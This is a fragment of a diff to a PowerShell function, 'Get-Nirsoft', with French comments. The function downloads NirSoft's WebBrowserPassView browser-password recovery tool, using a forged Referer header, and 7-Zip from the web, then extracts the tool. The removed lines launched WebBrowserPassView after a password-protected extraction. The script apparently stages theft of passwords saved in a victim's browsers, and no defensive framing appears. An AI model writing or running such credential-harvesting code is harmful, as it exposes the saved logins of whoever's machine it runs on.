@@ -59,14 +59,7 @@ function Get-Nirsoft {
     Invoke-WebRequest -Headers @{'Referer' = 'https://www.nirsoft.net/utils/web_browser_password.html'} -Uri https://www.nirsoft.net/toolsdownload/webbrowserpassview.zip -OutFile wbpv.zip
     Invoke-WebRequest -Uri https://www.7-zip.org/a/7za920.zip -OutFile 7z.zip
     Expand-Archive 7z.zip
-
-    # Utiliser Start-Process pour lancer la commande avec le mot de passe redirigé via stdin
-    Start-Process -FilePath ".\7z\7za.exe" -ArgumentList "e wbpv.zip" -RedirectStandardInput "C:\temp\password.txt" -Wait
-    
-    # Pause de 5 secondes
-    Start-Sleep -Seconds 5
-    
-    .\WebBrowserPassView.exe
+    .\7z\7za.exe e wbpv.zip
 }
 
 
